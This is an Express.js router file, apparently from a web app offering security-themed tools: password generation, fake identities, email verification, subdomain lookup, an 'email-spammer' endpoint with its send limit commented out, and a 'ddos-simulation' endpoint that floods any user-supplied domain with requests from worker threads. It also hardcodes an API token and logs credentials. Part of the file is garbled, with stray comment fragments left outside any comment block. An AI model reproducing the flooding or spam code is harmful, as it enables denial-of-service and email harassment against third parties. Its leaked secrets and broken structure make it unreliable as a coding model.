import express from "express";
import crypto from "crypto";
import axios from "axios";
import fs from "fs";
// import { MailtrapTransport } from "@mailtrap/nodemailer";
// import nodemailer from "nodemailer";
import { MailtrapClient } from "mailtrap";
import Nodemailer from "nodemailer";
import { MailtrapTransport } from "mailtrap";

import path from "path";
import { faker } from "@faker-js/faker";
import verifyToken from "../../middleware/verifyToken.js";
import dotenv from "dotenv";
import { Worker, isMainThread, parentPort, workerData } from "worker_threads";
dotenv.config();

const publicRouter = express.Router();

/**
 * @swagger
 * /public/features:
 *   get:
 *     summary: Test public route
 *     description: Returns a message that the route is public.
 *     responses:
 *       200:
 *         description: Success
 */
publicRouter.get("/features", verifyToken, (req, res) => {
  res.send("This is a public route accessible to everyone.");
});

/**
 * @swagger
 * /public/features/generate-secured-password:
 *   get:
 *     summary: Generate a secured password
 *     description: Generates a random secured password using crypto.
 *     responses:
 *       200:
 *         description: A secured password is returned
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 securedPassword:
 *                   type: string
 *                   description: The generated secured password
 */
publicRouter.get(
  "/features/generate-secured-password",
  verifyToken,
  (req, res) => {
    const length = 12;
    const password = crypto.randomBytes(length).toString("hex");

    res.status(200).json({ securedPassword: password });
  }
);

/**
 * @swagger
 * /public/features/generate-fictive-identity:
 *   get:
 *     summary: Generate a fictive identity
 *     description: Generates a fake identity with name, email, phone, address, birthdate, and avatar using Faker.js.
 *     responses:
 *       200:
 *         description: A fictive identity is returned
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 identity:
 *                   type: object
 *                   properties:
 *                     firstName:
 *                       type: string
 *                     lastName:
 *                       type: string
 *                     email:
 *                       type: string
 *                     phoneNumber:
 *                       type: string
 *                     address:
 *                       type: object
 *                       properties:
 *                         street:
 *                           type: string
 *                         city:
 *                           type: string
 *                         country:
 *                           type: string
 *                     birthdate:
 *                       type: string
 *                       format: date
 *                     avatar:
 *                       type: string
 */
publicRouter.get(
  "/features/generate-fictive-identity",
  verifyToken,
  (req, res) => {
    const fakeIdentity = {
      firstName: faker.person.firstName(),
      lastName: faker.person.lastName(),
      email: faker.internet.email(),
      phoneNumber: faker.phone.number(),
      address: {
        street: faker.location.streetAddress(),
        city: faker.location.city(),
        country: faker.location.country(),
      },
      birthdate: faker.date.birthdate({ min: 18, max: 65, mode: "age" }),
      avatar: faker.image.avatar(),
    };

    res.status(200).json({ identity: fakeIdentity });
  }
);

/**
 * @swagger
 * /public/features/verify-email:
 *   post:
 *     summary: Verify email address
 *     description: Verify the existence of an email address using Hunter.io API.
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               email:
 *                 type: string
 *                 description: Email to verify
 *     responses:
 *       200:
 *         description: Email verification result
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 *                 result:
 *                   type: object
 */
publicRouter.post("/features/verify-email", verifyToken, async (req, res) => {
  const { email } = req.body;

  if (!email) {
    return res.status(400).json({ message: "Email is required" });
  }

  try {
    const apiKey = process.env.HUNTER_API_KEY;
    const response = await axios.get(
      `https://api.hunter.io/v2/email-verifier`,
      {
        params: {
          email,
          api_key: apiKey,
        },
      }
    );

    if (response.data && response.data.data) {
      const verificationResult = response.data.data;
      res.status(200).json({
        message: "Email verification completed",
        result: verificationResult,
      });
    } else {
      res.status(400).json({ message: "Invalid email or verification failed" });
    }
  } catch (error) {
    console.error(error);
    res.status(500).json({
      message: "An error occurred while verifying the email",
      error: error.message,
    });
  }
});

const commonPasswordsPath = path.join(
  path.resolve(),
  "data",
  "common-passwords.txt"
);

const commonPasswords = fs
  .readFileSync(commonPasswordsPath, "utf-8")
  .split("\n")
  .map((password) => password.trim());

/**
 * @swagger
 * /public/features/check-common-password:
 *   post:
 *     summary: Check if password is common
 *     description: Verifies if a password is too common by checking it against a list of common passwords.
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               password:
 *                 type: string
 *                 description: Password to check
 *     responses:
 *       200:
 *         description: Password check result
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 */
publicRouter.post(
  "/features/check-common-password",
  verifyToken,
  (req, res) => {
    const { password } = req.body;

    if (!password) {
      return res.status(400).json({ message: "Password is required" });
    }

    const isCommon = commonPasswords.includes(password);

    if (isCommon) {
      return res.status(200).json({
        message: "Password is too common, please choose a more secure one.",
      });
    }

    res.status(200).json({ message: "Password is secure." });
  }
);

/**
 * @swagger
 * /public/features/domain-info:
 *   post:
 *     summary: Retrieve domain and subdomains information
 *     description: Retrieves all subdomains associated with a given domain using the SecurityTrails API.
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               domain:
 *                 type: string
 *                 description: Domain name to retrieve subdomains for
 *     responses:
 *       200:
 *         description: List of subdomains
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 domain:
 *                   type: string
 *                 subdomains:
 *                   type: array
 *                   items:
 *                     type: string
 */
publicRouter.post("/features/domain-info", verifyToken, async (req, res) => {
  const { domain } = req.body;

  if (!domain) {
    return res.status(400).json({ message: "Domain is required" });
  }

  try {
    const apiKey = process.env.SECURITYTRAILS_API_KEY;
    const response = await axios.get(
      `https://api.securitytrails.com/v1/domain/${domain}/subdomains`,
      {
        headers: {
          APIKEY: apiKey,
        },
      }
    );

    const subdomains = response.data.subdomains || [];

    const fullDomains = subdomains.map((subdomain) => `${subdomain}.${domain}`);

    res.status(200).json({
      domain: domain,
      subdomains: fullDomains,
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      message: "Error fetching domain information",
      error: error.message,
    });
  }
});

/**
 * @swagger
 * /public/features/email-spammer:
 *   post:
 *     summary: Email spammer
 *     description: Sends a certain number of emails to a given address with the provided content.
 * /public/features/ddos-simulation:
 *   post:
 *     summary: Start DDoS simulation
 *     description: Initiates a DDoS simulation against the specified domain using worker threads to send multiple requests.
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               email:
 *                 type: string
 *                 description: The email address to spam
 *               content:
 *                 type: string
 *                 description: The content of the email
 *               nbSend:
 *                 type: integer
 *                 description: The number of times to send the email
 *     responses:
 *       200:
 *         description: Emails successfully sent
 *       400:
 *         description: Missing parameters
 *       500:
 *         description: Error sending emails
 */
// publicRouter.post("/features/email-spammer", verifyToken, async (req, res) => {
//   const { email, content, nbSend } = req.body;

//   console.log("process.env.GMAIL_USER: ", process.env.GMAIL_USER);
//   console.log("process.env.GMAIL_PASSWORD: ", process.env.GMAIL_PASSWORD);

//   if (!email || !content || !nbSend) {
//     return res
//       .status(400)
//       .json({ message: "Email, content, and nbSend are required" });
//   }

//   // Limiter le nombre d'envois
//   if (nbSend > 5) {
//     return res
//       .status(400)
//       .json({ message: "Maximum 100 emails allowed to be sent at once." });
//   }

//   // Configuration du transporteur de mail (Gmail est utilisé comme exemple)
//   const transporter = nodemailer.createTransport({
//     service: "smtp.mailgun.org",
//     port: 587,
//     auth: {
//       user: process.env.GMAIL_USER,
//       pass: process.env.GMAIL_PASSWORD,
//     },
//   });

//   // Définition de l'email de base
//   const mailOptions = {
//     from: process.env.GMAIL_USER,
//     to: email,
//     subject: "Spam Email",
//     text: content,
//   };

//   try {
//     // Envoi des emails nbSend fois
//     for (let i = 0; i < nbSend; i++) {
//       await transporter.sendMail(mailOptions);
//       console.log(`Email ${i + 1} sent to ${email}`);
//     }

//     res
//       .status(200)
//       .json({ message: `${nbSend} emails successfully sent to ${email}` });
//   } catch (error) {
//     console.error("Error sending email:", error);
//     res
//       .status(500)
//       .json({ message: "Error sending emails", error: error.message });
//   }
// });

// Initialisation du client Mailtrap avec la clé API
// const mailtrap = new MailtrapClient({ token: process.env.MAILTRAP_TOKEN });

publicRouter.post("/features/email-spammer", verifyToken, async (req, res) => {
  const { email, content, nbSend } = req.body;

  // Affiche le token Mailtrap pour le débogage
  console.log("process.env.MAILTRAP_TOKEN: ", process.env.MAILTRAP_TOKEN);

  const TOKEN = "c229e7ea2e8c1269d51f95e569798428";

  // Validation des champs requis
  if (!email || !content || !nbSend) {
    return res.status(400).json({
      message: "Email, content, and nbSend are required",
    });
  }

  // Limiter le nombre d'envois
  // if (nbSend > 5) {
  //   return res.status(400).json({
  //     message: "Maximum 5 emails allowed to be sent at once.",
  //   });
  // }

  // Création d'une instance du client Mailtrap
  const client = new MailtrapClient({
    token: TOKEN,
  });

  const sender = {
    email: "hello@demomailtrap.com",
    name: "Mailtrap Test",
  };
  const recipients = [
    {
      email: email,
    },
  ];

  try {
    const response = await client.bulk.send({
      from: sender,
      to: recipients,
      subject: "You are awesome!",
      text: content,
      category: "Integration Test",
    });

    console.log("Emails sent successfully:", response);
    res.status(200).json({
      message: `${nbSend} emails successfully sent to ${email}`,
    });
  } catch (error) {
    console.error("Error sending email:", error);

    res.status(500).json({
      message: "Error sending emails",
      error: error.message,
    });
  }
});

 *               domain:
 *                 type: string
 *                 description: Domain to attack
 *               numWorkers:
 *                 type: integer
 *                 description: Number of worker threads to use
 *               requestsPerWorker:
 *                 type: integer
 *                 description: Number of requests each worker should send
 *     responses:
 *       200:
 *         description: DDoS simulation started
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 */
publicRouter.post(
  "/features/ddos-simulation",
  verifyToken,
  async (req, res) => {
    const { domain, numWorkers = 10, requestsPerWorker = 100 } = req.body;

    if (!domain) {
      return res.status(400).json({ message: "Domain is required." });
    }

    console.log("Target Domain: ", domain);

    const workers = [];

    for (let i = 0; i < numWorkers; i++) {
      const worker = new Worker(new URL(import.meta.url), {
        workerData: { domain, requestsPerWorker },
      });

      workers.push(worker);

      worker.on("exit", (code) => {
        console.log(`Worker exited with code ${code}`);
      });
    }

    res.status(200).json({ message: `DDoS simulation started on ${domain}.` });
  }
);

if (!isMainThread) {
  const { domain, requestsPerWorker } = workerData;

  const sendRequests = async () => {
    for (let i = 0; i < requestsPerWorker; i++) {
      try {
        const response = await axios.get(domain);

        console.log(`Request to ${domain}: ${response.status}`);
      } catch (error) {
        console.error(`Error hitting ${domain}: ${error.message}`);
      }
    }
  };

  sendRequests();
}
export default publicRouter;
